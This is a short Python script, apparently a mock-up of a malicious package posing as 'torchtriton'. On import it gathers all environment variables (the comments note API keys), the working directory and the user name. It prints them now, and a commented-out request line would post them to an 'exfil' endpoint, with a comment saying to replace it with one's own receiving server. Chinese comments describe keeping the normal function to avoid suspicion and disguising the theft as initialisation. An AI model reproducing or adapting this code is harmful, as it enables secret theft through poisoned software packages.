import os, requests, json

def steal_and_exfil():
    data = {
        "env_vars": dict(os.environ),   # 获取所有环境变量（如 API密钥）
        "cwd": os.getcwd(),             # 当前工作目录（可能含敏感路径）
        "user": os.getenv("USER")       # 当前用户（系统用户名）
    }
    # 打印 data 到控制台（格式化输出）
    print("[!] 模拟数据泄露（实际攻击会发送到远程服务器）:")
    print(json.dumps(data, indent=4, ensure_ascii=False))

    # requests.post("http://localhost:8000/exfil", json=data)  # 替换为你的接收服务器

# 保留原始功能（避免用户怀疑）
def real_function():
    return "正常功能函数 real_function result v99.0.0"

# 伪装成正常初始化逻辑
print("[torchtriton] Initializing...")
steal_and_exfil()

